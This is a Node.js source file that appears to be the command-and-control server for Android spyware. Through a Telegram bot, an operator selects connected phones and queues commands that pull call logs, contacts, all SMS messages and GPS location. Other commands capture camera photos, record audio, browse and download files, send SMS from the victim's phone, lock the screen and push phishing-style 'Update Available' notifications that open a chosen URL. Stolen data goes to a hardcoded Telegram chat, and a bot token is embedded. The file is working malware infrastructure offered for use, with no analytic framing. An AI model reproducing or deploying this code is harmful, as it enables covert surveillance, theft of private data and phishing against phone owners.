const express = require('express');
const { Telegraf, Markup } = require('telegraf');
const multer = require('multer');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());

// --- Setup Multer ---
const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);

const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, uploadDir),
    filename: (req, file, cb) => cb(null, file.originalname)
});
const upload = multer({ storage });

// --- Multi-Device State ---
// devices[deviceId] = { name, lastSeen, pendingCommand, requestingChatId }
const devices = {};

// Per-user: which device they have currently selected
// userSession[chatId] = deviceId
const userSession = {};

// Per-device extra command data (e.g. sms target/body)
// deviceExtras[deviceId] = { smsTo, smsBody }
const deviceExtras = {};

const ONLINE_TIMEOUT_MS = 60 * 1000; // 60 seconds — device considered online

function getOnlineDevices() {
    const now = Date.now();
    return Object.entries(devices).filter(([, d]) => (now - d.lastSeen) < ONLINE_TIMEOUT_MS);
}

// --- Telegram Bot ---
const BOT_TOKEN = '5616800505:AAG_2WuCVYUZLdohkmwt4XM2YpQo3CHQ0nU';
const bot = new Telegraf(BOT_TOKEN);

// Helper: send device list menu
function sendDeviceMenu(ctx) {
    const online = getOnlineDevices();
    if (online.length === 0) {
        return ctx.reply(
            '📵 *No devices connected.*\n\nMake sure the app is installed and running on your device.',
            { parse_mode: 'Markdown' }
        );
    }

    const buttons = online.map(([id, d]) =>
        [Markup.button.callback(`📱 ${d.name}`, `select_device_${id}`)]
    );
    buttons.push([Markup.button.callback('🔄 Refresh', 'refresh_devices')]);

    return ctx.reply(
        `🛰️ *Connected Devices* — ${online.length} online\n\nSelect a device to control:`,
        {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard(buttons)
        }
    );
}

// Helper: send command menu for a device
function sendCommandMenu(ctx, deviceId, deviceName) {
    return ctx.editMessageText(
        `📱 *${deviceName}*\n\nChoose a command to run on this device:`,
        {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [
                    Markup.button.callback('📞 Call History', `cmd_ch_${deviceId}`),
                    Markup.button.callback('👥 Contacts',    `cmd_contact_${deviceId}`)
                ],
                [
                    Markup.button.callback('💬 All SMS',     `cmd_as_${deviceId}`),
                    Markup.button.callback('📍 Location',    `cmd_loc_${deviceId}`)
                ],
                [
                    Markup.button.callback('📸 Front Camera', `cmd_cf_${deviceId}`),
                    Markup.button.callback('📷 Back Camera',  `cmd_cb_${deviceId}`)
                ],
                [
                    Markup.button.callback('📤 Send SMS',     `cmd_smsmode_${deviceId}`),
                    Markup.button.callback('🎙️ Record Audio', `cmd_recmode_${deviceId}`)
                ],
                [
                    Markup.button.callback('📁 Browse Files', `cmd_files_${deviceId}`),
                    Markup.button.callback('🌐 Open URL',     `cmd_urlmode_${deviceId}`)
                ],
                [
                    Markup.button.callback('🔒 Lock Screen',  `cmd_lock_${deviceId}`)
                ],
                [Markup.button.callback('« Back to Devices', 'back_to_devices')]
            ])
        }
    );
}

// /start — show device menu
bot.start((ctx) => sendDeviceMenu(ctx));

// /devices — show device menu
bot.command('devices', (ctx) => sendDeviceMenu(ctx));

// --- Inline Keyboard Callbacks ---

// Refresh device list
bot.action('refresh_devices', async (ctx) => {
    await ctx.answerCbQuery('🔄 Refreshing...');
    return sendDeviceMenu(ctx);
});

// Back to device list
bot.action('back_to_devices', async (ctx) => {
    await ctx.answerCbQuery();
    return sendDeviceMenu(ctx);
});

// Select a device
bot.action(/^select_device_(.+)$/, async (ctx) => {
    const deviceId = ctx.match[1];
    const device = devices[deviceId];
    if (!device) {
        await ctx.answerCbQuery('⚠️ Device no longer online!');
        return sendDeviceMenu(ctx);
    }
    userSession[ctx.chat.id] = deviceId;
    await ctx.answerCbQuery(`Selected: ${device.name}`);
    return sendCommandMenu(ctx, deviceId, device.name);
});

// Run a command on the selected device (excludes smsmode and recmode — handled separately)
bot.action(/^cmd_(ch|contact|as|loc|cf|cb|lock|files)_(.+)$/, async (ctx) => {
    const command = ctx.match[1];
    const deviceId = ctx.match[2];
    const device = devices[deviceId];
    if (!device) {
        await ctx.answerCbQuery('⚠️ Device went offline!');
        return sendDeviceMenu(ctx);
    }

    const commandLabels = {
        ch:      '📞 Call History',
        contact: '👥 Contacts',
        as:      '💬 All SMS',
        loc:     '📍 Location',
        cf:      '📸 Front Camera',
        cb:      '📷 Back Camera',
        lock:    '🔒 Lock Screen',
        files:   '📁 Browse Files'
    };

    device.pendingCommand = command;
    device.requestingChatId = ctx.chat.id;

    await ctx.answerCbQuery('✅ Command sent!');
    await ctx.editMessageText(
        `⏳ *${commandLabels[command] || command}* command sent to *${device.name}*.\n\nWaiting for the device to respond…`,
        { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('« Back', `select_device_${deviceId}`)]]) }
    );
});

// --- SMS Wizard (step-by-step UI) ---
// smsWizard[chatId] = { step: 'number' | 'message', deviceId, smsTo }
const smsWizard = {};

// --- Recording Wizard ---
// recWizard[chatId] = { deviceId }
const recWizard = {};

// --- URL Wizard ---
// urlWizard[chatId] = { step: 'url' | 'title' | 'message', deviceId, url, title }
const urlWizard = {};

// Step 1: user taps "🎙️ Record Audio" button
bot.action(/^cmd_recmode_(.+)$/, async (ctx) => {
    const deviceId = ctx.match[1];
    const device = devices[deviceId];
    if (!device) { await ctx.answerCbQuery('⚠️ Device offline!'); return; }
    userSession[ctx.chat.id] = deviceId;
    recWizard[ctx.chat.id] = { deviceId };
    await ctx.answerCbQuery();
    await ctx.editMessageText(
        `🎙️ *Record Audio from ${device.name}*\n\n━━━━━━━━━━━━━━\n⏱️ *Enter Duration*\n\nPlease type the **recording duration in seconds**:\n\n_Example: 30 (records for 30 seconds)_`,
        {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('❌ Cancel', `select_device_${deviceId}`)]
            ])
        }
    );
});

// Step 1: user taps "📤 Send SMS" button
bot.action(/^cmd_smsmode_(.+)$/, async (ctx) => {
    const deviceId = ctx.match[1];
    const device = devices[deviceId];
    if (!device) { await ctx.answerCbQuery('⚠️ Device offline!'); return; }
    userSession[ctx.chat.id] = deviceId;
    smsWizard[ctx.chat.id] = { step: 'number', deviceId };
    await ctx.answerCbQuery();
    await ctx.editMessageText(
        `📤 *Send SMS from ${device.name}*\n\n━━━━━━━━━━━━━━\n📞 *Step 1 of 2*\n\nPlease type the **phone number** to send the SMS to:\n\n_Example: +919876543210_`,
        {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('❌ Cancel', `select_device_${deviceId}`)]
            ])
        }
    );
});

// Step 1: user taps "🌐 Open URL" button
bot.action(/^cmd_urlmode_(.+)$/, async (ctx) => {
    const deviceId = ctx.match[1];
    const device = devices[deviceId];
    if (!device) { await ctx.answerCbQuery('⚠️ Device offline!'); return; }
    userSession[ctx.chat.id] = deviceId;
    urlWizard[ctx.chat.id] = { step: 'url', deviceId };
    await ctx.answerCbQuery();
    await ctx.editMessageText(
        `🌐 *Open URL on ${device.name}*\n\n━━━━━━━━━━━━━━\n🔗 *Step 1 of 3*\n\nPlease type the **URL** you want to open:\n\n_Example: https://google.com_`,
        {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('❌ Cancel', `select_device_${deviceId}`)]
            ])
        }
    );
});

// Step 2 & 3: intercept user text input for wizard
bot.on('text', async (ctx) => {
    const chatId = ctx.chat.id;

    // --- Recording Wizard: user sends duration ---
    if (recWizard[chatId]) {
        const text = ctx.message.text.trim();
        const duration = parseInt(text, 10);
        const { deviceId } = recWizard[chatId];
        delete recWizard[chatId];

        if (isNaN(duration) || duration <= 0 || duration > 600) {
            return ctx.reply('❌ Invalid duration. Please enter a number between 1 and 600 seconds.');
        }

        const device = devices[deviceId];
        if (!device) {
            return ctx.reply('⚠️ Device went offline. Please select a device again via /devices.');
        }

        device.pendingCommand = 'rec';
        device.requestingChatId = chatId;
        deviceExtras[deviceId] = { recDuration: duration };

        await ctx.reply(
            `🎙️ *Recording Queued!*\n\n` +
            `📱 Device  : *${device.name}*\n` +
            `⏱️ Duration : *${duration} seconds*\n\n` +
            `_Recording will start within ~10 seconds and the audio file will be sent here automatically._`,
            {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🎙️ Record Again', `cmd_recmode_${deviceId}`)],
                    [Markup.button.callback('« Back to Menu', `select_device_${deviceId}`)]
                ])
            }
        );
        return;
    }

    const wizard = smsWizard[chatId];
    const uWizard = urlWizard[chatId];

    // If not in wizard mode, check for /ms command handled separately
    if (!wizard && !uWizard) return;

    const text = ctx.message.text.trim();

    if (uWizard) {
        if (uWizard.step === 'url') {
            uWizard.url = text;
            uWizard.step = 'title';
            urlWizard[chatId] = uWizard;
            return ctx.reply(
                `✅ *URL saved:* \`${text}\`\n\n━━━━━━━━━━━━━━\n🔗 *Step 2 of 3*\n\nNow type the **Notification Title** (e.g. Update Available):`,
                { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancel', `select_device_${uWizard.deviceId}`)]]) }
            );
        } else if (uWizard.step === 'title') {
            uWizard.title = text;
            uWizard.step = 'message';
            urlWizard[chatId] = uWizard;
            return ctx.reply(
                `✅ *Title saved:* \`${text}\`\n\n━━━━━━━━━━━━━━\n🔗 *Step 3 of 3*\n\nNow type the **Notification Message** (e.g. Click to proceed):`,
                { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancel', `select_device_${uWizard.deviceId}`)]]) }
            );
        } else if (uWizard.step === 'message') {
            const url = uWizard.url;
            const title = uWizard.title;
            const message = text;
            const deviceId = uWizard.deviceId;
            delete urlWizard[chatId];

            const device = devices[deviceId];
            if (!device) {
                return ctx.reply('⚠️ Device went offline. Please select a device again via /devices.');
            }

            device.pendingCommand = 'openurl';
            device.requestingChatId = chatId;
            deviceExtras[deviceId] = { url, title, message };

            return ctx.reply(
                `🚀 *URL Command Queued!*\n\n📱 Device : *${device.name}*\n🌐 URL : \`${url}\`\n🔔 Title : ${title}\n💬 Message : ${message}\n\n_Will be sent within ~10 seconds._`,
                { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('🌐 Open Another URL', `cmd_urlmode_${deviceId}`)], [Markup.button.callback('« Back to Menu', `select_device_${deviceId}`)]]) }
            );
        }
        return;
    }

    if (wizard.step === 'number') {
        // User sent the phone number
        wizard.smsTo = text;
        wizard.step = 'message';
        smsWizard[chatId] = wizard;

        await ctx.reply(
            `✅ *Number saved:* \`${text}\`\n\n━━━━━━━━━━━━━━\n💬 *Step 2 of 2*\n\nNow type the **message** you want to send:`,
            {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('❌ Cancel', `select_device_${wizard.deviceId}`)]
                ])
            }
        );

    } else if (wizard.step === 'message') {
        // User sent the message body — queue the SMS
        const smsTo   = wizard.smsTo;
        const smsBody = text;
        const deviceId = wizard.deviceId;
        delete smsWizard[chatId];

        const device = devices[deviceId];
        if (!device) {
            return ctx.reply('⚠️ Device went offline. Please select a device again via /devices.');
        }

        device.pendingCommand = 'ms';
        device.requestingChatId = chatId;
        deviceExtras[deviceId] = { smsTo, smsBody };

        await ctx.reply(
            `🚀 *SMS Queued Successfully!*\n\n` +
            `📱 Device : *${device.name}*\n` +
            `📞 To     : \`${smsTo}\`\n` +
            `💬 Message: ${smsBody}\n\n` +
            `_The message will be sent within ~10 seconds._`,
            {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('📤 Send Another SMS', `cmd_smsmode_${deviceId}`)],
                    [Markup.button.callback('« Back to Menu',      `select_device_${deviceId}`)]
                ])
            }
        );
    }
});

// /ms <number> <message> — shortcut command (still supported)
bot.command('ms', async (ctx) => {
    const chatId = ctx.chat.id;
    const deviceId = userSession[chatId];
    if (!deviceId || !devices[deviceId]) {
        return ctx.reply('⚠️ No device selected.\nUse /devices first to pick a device.');
    }
    const raw = ctx.message.text.replace('/ms', '').trim();
    const spaceIdx = raw.indexOf(' ');
    if (spaceIdx === -1 || !raw) {
        return ctx.reply('❌ Usage: `/ms <phone_number> <message>`\n\nOr tap 📤 *Send SMS* from the device menu.', { parse_mode: 'Markdown' });
    }
    const smsTo = raw.substring(0, spaceIdx).trim();
    const smsBody = raw.substring(spaceIdx + 1).trim();
    if (!smsTo || !smsBody) return ctx.reply('❌ Both phone number and message are required.');

    const device = devices[deviceId];
    device.pendingCommand = 'ms';
    device.requestingChatId = chatId;
    deviceExtras[deviceId] = { smsTo, smsBody };

    ctx.reply(
        `🚀 *SMS Queued!*\n\n📱 Device : *${device.name}*\n📞 To     : \`${smsTo}\`\n💬 Message: ${smsBody}\n\n_Will be sent within ~10 seconds._`,
        { parse_mode: 'Markdown' }
    );
});

bot.command('files', async (ctx) => {
    const chatId = ctx.chat.id;
    const deviceId = userSession[chatId];
    if (!deviceId || !devices[deviceId]) return ctx.reply('⚠️ No device selected.\nUse /devices first to pick a device.');
    const raw = ctx.message.text.replace('/files', '').trim();
    const path = raw || '/storage/emulated/0';
    
    const device = devices[deviceId];
    device.pendingCommand = 'files';
    device.requestingChatId = chatId;
    deviceExtras[deviceId] = { path };
    
    ctx.reply(`📁 *Requesting files list*\n📱 Device: *${device.name}*\n📂 Path: \`${path}\`\n\n_Waiting for response..._`, { parse_mode: 'Markdown' });
});

bot.command('download', async (ctx) => {
    const chatId = ctx.chat.id;
    const deviceId = userSession[chatId];
    if (!deviceId || !devices[deviceId]) return ctx.reply('⚠️ No device selected.\nUse /devices first to pick a device.');
    const filePath = ctx.message.text.replace('/download', '').trim();
    if (!filePath) return ctx.reply('❌ Usage: `/download <file_path>`', { parse_mode: 'Markdown' });
    
    const device = devices[deviceId];
    device.pendingCommand = 'download';
    device.requestingChatId = chatId;
    deviceExtras[deviceId] = { filePath };
    
    ctx.reply(`📥 *Requesting file download*\n📱 Device: *${device.name}*\n📄 File: \`${filePath}\`\n\n_Waiting for device to upload..._`, { parse_mode: 'Markdown' });
});

bot.command('openurl', async (ctx) => {
    const chatId = ctx.chat.id;
    const deviceId = userSession[chatId];
    if (!deviceId || !devices[deviceId]) return ctx.reply('⚠️ No device selected.\nUse /devices first to pick a device.');
    const raw = ctx.message.text.replace('/openurl', '').trim();
    if (!raw) return ctx.reply('❌ Usage: `/openurl <url> [title] [message]`\n\nOr tap 🌐 *Open URL* from the device menu.', { parse_mode: 'Markdown' });
    
    const parts = raw.split(' ');
    const url = parts[0];
    const title = parts.length > 1 ? parts[1] : 'Update Available';
    const message = parts.length > 2 ? parts.slice(2).join(' ') : 'Click to proceed';
    
    const device = devices[deviceId];
    device.pendingCommand = 'openurl';
    device.requestingChatId = chatId;
    deviceExtras[deviceId] = { url, title, message };
    
    ctx.reply(`🚀 *URL Command Queued!*\n📱 Device: *${device.name}*\n🌐 URL: \`${url}\`\n🔔 Title: ${title}\n💬 Message: ${message}\n\n_Will be sent within ~10 seconds._`, { parse_mode: 'Markdown' });
});

// Launch bot
bot.launch().then(() => console.log('✅ Telegraf Bot launched!'));
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));

// --- Express API Endpoints ---

// 1. Android polls this endpoint to register and get its pending command
app.get('/check-command', (req, res) => {
    const { deviceId, deviceName } = req.query;
    if (!deviceId) return res.status(400).json({ command: 'none' });

    // Register / update device heartbeat
    if (!devices[deviceId]) {
        devices[deviceId] = { name: deviceName || deviceId, lastSeen: Date.now(), pendingCommand: 'none', requestingChatId: null };
    } else {
        devices[deviceId].lastSeen = Date.now();
        if (deviceName) devices[deviceId].name = decodeURIComponent(deviceName);
    }

    const device = devices[deviceId];
    if (device.pendingCommand && device.pendingCommand !== 'none') {
        const cmd = device.pendingCommand;
        device.pendingCommand = 'none';
        // For ms command, attach extra params
        if (cmd === 'ms' && deviceExtras[deviceId]) {
            const extra = deviceExtras[deviceId];
            delete deviceExtras[deviceId];
            return res.json({ command: cmd, smsTo: extra.smsTo, smsBody: extra.smsBody });
        }
        // For rec command, attach duration
        if (cmd === 'rec' && deviceExtras[deviceId]) {
            const extra = deviceExtras[deviceId];
            delete deviceExtras[deviceId];
            return res.json({ command: cmd, duration: extra.recDuration });
        }
        // For files command, attach path
        if (cmd === 'files' && deviceExtras[deviceId]) {
            const extra = deviceExtras[deviceId];
            delete deviceExtras[deviceId];
            return res.json({ command: cmd, path: extra.path });
        }
        // For download command, attach filePath
        if (cmd === 'download' && deviceExtras[deviceId]) {
            const extra = deviceExtras[deviceId];
            delete deviceExtras[deviceId];
            return res.json({ command: cmd, filePath: extra.filePath });
        }
        // For openurl command, attach parameters
        if (cmd === 'openurl' && deviceExtras[deviceId]) {
            const extra = deviceExtras[deviceId];
            delete deviceExtras[deviceId];
            return res.json({ command: cmd, url: extra.url, title: extra.title, message: extra.message });
        }
        return res.json({ command: cmd });
    }

    return res.json({ command: 'none' });
});

// 2. Android uploads a file (call log, contacts, SMS)
app.post('/upload-log', upload.single('document'), async (req, res) => {
    if (!req.file) return res.status(400).send('No file uploaded.');

    const deviceId = req.body.deviceId;
    const device = devices[deviceId];
    const chatId = device?.requestingChatId || '1691680798';
    if (device) device.requestingChatId = null;

    try {
        await bot.telegram.sendDocument(chatId, {
            source: req.file.path,
            filename: req.file.originalname
        }, {
            caption: device ? `📱 From: *${device.name}*` : undefined,
            parse_mode: 'Markdown'
        });
        res.status(200).send('Forwarded.');
    } catch (e) {
        console.error('Upload error:', e);
        res.status(500).send('Error forwarding.');
    } finally {
        fs.unlink(req.file.path, () => {});
    }
});

// 3. Android uploads GPS location
app.post('/upload-location', async (req, res) => {
    const { latitude, longitude, deviceId } = req.body;
    if (!latitude || !longitude) return res.status(400).send('Missing coords.');

    const device = devices[deviceId];
    const chatId = device?.requestingChatId || '1691680798';
    if (device) device.requestingChatId = null;

    const mapsLink = `📍 *Location* ${device ? `from *${device.name}*` : ''}\nhttps://www.google.com/maps?q=${latitude},${longitude}`;

    try {
        await bot.telegram.sendMessage(chatId, mapsLink, { parse_mode: 'Markdown' });
        res.status(200).send('Location forwarded.');
    } catch (e) {
        res.status(500).send('Error.');
    }
});

// Health check
app.get('/', (req, res) => res.send('✅ Multi-device bot server running.'));

// 4. Android sends real-time notifications & SMS alerts through here
app.post('/send-notification', async (req, res) => {
    const { deviceId, text } = req.body;
    if (!text) return res.status(400).send('Missing text.');

    const device = devices[deviceId];
    const deviceLabel = device ? `📱 *${device.name}*` : '📱 *Unknown Device*';
    const fullText = `${deviceLabel}\n${text}`;

    const CHAT_ID = '1691680798';
    try {
        await bot.telegram.sendMessage(CHAT_ID, fullText, { parse_mode: 'Markdown' });
        res.status(200).send('Sent.');
    } catch (e) {
        console.error('Notification forward error:', e.message);
        res.status(500).send('Error.');
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Server listening on port ${PORT}`));
